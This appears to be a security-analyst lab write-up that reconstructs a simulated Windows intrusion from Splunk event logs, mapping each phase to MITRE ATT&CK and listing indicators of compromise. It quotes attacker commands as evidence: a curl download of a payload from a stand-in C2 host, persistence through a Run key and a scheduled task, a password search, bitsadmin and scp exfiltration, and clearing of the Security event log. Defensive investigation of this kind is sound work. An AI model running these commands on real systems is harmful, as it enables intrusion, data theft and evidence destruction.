# 🛡️ Investigation 12 – Command & Control (C2) Beaconing & Data Exfiltration

## 📌 Scenario

A Windows workstation (`WIN-FIN01`) exhibited suspicious PowerShell execution, outbound network connections, file staging, and archive creation activities. The objective of this investigation was to determine the complete attack lifecycle, identify attacker persistence mechanisms, detect Command & Control (C2) communication, and analyze data exfiltration attempts.

---

# 🎯 Investigation Objectives

- Analyze Windows Security Event Logs
- Identify attacker reconnaissance activities
- Detect payload download and execution
- Investigate persistence mechanisms
- Identify C2 communication
- Analyze file collection and staging
- Detect data exfiltration
- Investigate anti-forensics techniques
- Map attacker actions to MITRE ATT&CK

---

# 📊 Investigation Summary

| Category | Result |
|----------|--------|
| Total Events | **39** |
| Hostname | **WIN-FIN01** |
| Primary User | **john.smith** |
| Incident Severity | 🔴 Critical |
| Attack Type | Command & Control (C2) + Data Exfiltration |

---

# 📈 Event ID Analysis

| Event ID | Description | Count |
|----------|-------------|------:|
| 4624 | Successful Logon | 3 |
| 4625 | Failed Logon | 1 |
| 4634 | Logoff | 1 |
| 4663 | Object Access | 2 |
| 4672 | Special Privileges Assigned | 1 |
| 4688 | Process Creation | 25 |
| 4698 | Scheduled Task Created | 1 |
| 5156 | Windows Filtering Platform Allowed Connection | 5 |

---

# 📊 Severity Distribution

| Severity | Count |
|----------|------:|
| 🔴 Critical | 8 |
| 🟠 High | 11 |
| 🟡 Medium | 10 |
| 🟢 Low | 10 |

---

# 👤 Most Active User

| User | Events |
|------|-------:|
| **john.smith** | **33** |

The majority of suspicious activity was executed using the **john.smith** account, indicating either account compromise or malicious insider activity.

---

# 🔍 Investigation Findings

## Phase 1 – Initial Access

- Successful logon observed.
- Special privileges assigned.
- Attacker obtained an interactive session.

---

## Phase 2 – Reconnaissance

The attacker collected system information using legitimate Windows utilities.

### Commands Observed

```cmd
whoami /all
hostname
ipconfig /all
netstat -ano
tasklist
nslookup malicious-c2.example
```

### Purpose

- Identify current user
- Verify privilege level
- Discover hostname
- Enumerate network configuration
- View active network connections
- Resolve attacker-controlled domain

---

## Phase 3 – Payload Download

### Command

```cmd
curl.exe http://malicious-c2.example/payload.exe -o C:\Users\Public\payload.exe
```

### Findings

- Payload downloaded from remote infrastructure.
- Saved inside Public directory.
- Indicates Ingress Tool Transfer.

---

## Phase 4 – Payload Execution

### Command

```cmd
C:\Users\Public\payload.exe
```

### Findings

The downloaded payload was executed, giving the attacker an active foothold on the compromised workstation.

---

## Phase 5 – Persistence

### Registry Run Key

```cmd
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

The attacker configured the payload to execute automatically whenever the user logs in.

---

### Scheduled Task

```cmd
schtasks /create /sc minute /mo 5
```

A scheduled task was created to execute the payload every five minutes, ensuring persistence.

---

## Phase 6 – Command & Control (C2)

Repeated outbound connections observed.

Destination IP

```
185.199.110.153
```

The malware periodically communicated with the attacker-controlled server to receive commands and maintain remote access.

---

## Phase 7 – Credential Hunting

### Command

```cmd
findstr /si password *.txt *.docx
```

The attacker searched for stored passwords and sensitive information inside text and Microsoft Word documents.

---

## Phase 8 – File Staging

### Command

```cmd
robocopy Documents Public\staging /E
```

Sensitive files were copied into a staging directory before exfiltration.

---

## Phase 9 – Archive Creation

### Command

```cmd
7z.exe a data_archive.7z staging\
```

All staged files were compressed into a single archive to reduce transfer size and simplify exfiltration.

---

## Phase 10 – Data Exfiltration

### Method 1

```cmd
bitsadmin /upload
```

### Method 2

```cmd
scp.exe
```

The attacker uploaded archived files to remote infrastructure using multiple exfiltration techniques.

---

## Phase 11 – Cleanup

### Commands

```cmd
cmd.exe /c del data_archive.7z
cmd.exe /c del backup.zip
```

The attacker deleted local archives after successful exfiltration to remove evidence.

---

## Phase 12 – Anti-Forensics

### Command

```cmd
wevtutil cl Security
```

Windows Security Event Logs were cleared to hinder forensic investigation.

---

# 🧬 Complete Attack Timeline

```text
Successful Logon
        │
Reconnaissance
        │
PowerShell Execution
        │
Payload Download
        │
Payload Execution
        │
Registry Persistence
        │
Scheduled Task Persistence
        │
Command & Control (C2)
        │
Credential Hunting
        │
File Staging
        │
Archive Creation
        │
Data Exfiltration
        │
Cleanup
        │
Clear Windows Event Logs
```

---

# 🎯 MITRE ATT&CK Mapping

| Technique | ID |
|------------|----|
| System Owner/User Discovery | T1033 |
| System Information Discovery | T1082 |
| System Network Configuration Discovery | T1016 |
| System Network Connections Discovery | T1049 |
| PowerShell | T1059.001 |
| Ingress Tool Transfer | T1105 |
| User Execution | T1204.002 |
| Registry Run Keys | T1547.001 |
| Scheduled Task | T1053.005 |
| Application Layer Protocol (C2) | T1071 |
| Data from Local System | T1005 |
| Local Data Staging | T1074.001 |
| Archive Collected Data | T1560.001 |
| Exfiltration Over Alternative Protocol | T1048 |
| File Deletion | T1070.004 |
| Clear Windows Event Logs | T1070.001 |

---

# 🚩 Indicators of Compromise (IOCs)

## Host

- WIN-FIN01

## User

- john.smith

## External IP

- 185.199.110.153

## Suspicious Processes

- powershell.exe
- curl.exe
- payload.exe
- reg.exe
- schtasks.exe
- findstr.exe
- robocopy.exe
- 7z.exe
- bitsadmin.exe
- scp.exe
- wevtutil.exe

## Suspicious Files

- payload.exe
- data_archive.7z
- backup.zip

## Registry Persistence

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

---

# 🚨 Incident Conclusion

The investigation revealed a complete multi-stage cyber attack involving reconnaissance, payload delivery, persistence, Command & Control (C2) communication, credential hunting, file staging, archive creation, data exfiltration, cleanup, and anti-forensics. The attacker successfully maintained persistence, communicated with an external C2 server, collected sensitive information, exfiltrated archived data, and attempted to erase forensic evidence by clearing Windows Security Event Logs.

**Final Incident Severity:** 🔴 **Critical**

---

## 🛠️ Skills Demonstrated

- Splunk Log Analysis
- Windows Event Log Investigation
- SOC Investigation Methodology
- Threat Hunting
- Incident Response
- MITRE ATT&CK Mapping
- IOC Identification
- C2 Detection
- Data Exfiltration Analysis
- Windows Persistence Analysis
- Anti-Forensics Detection

---
⭐ **Investigation Status:** Completed
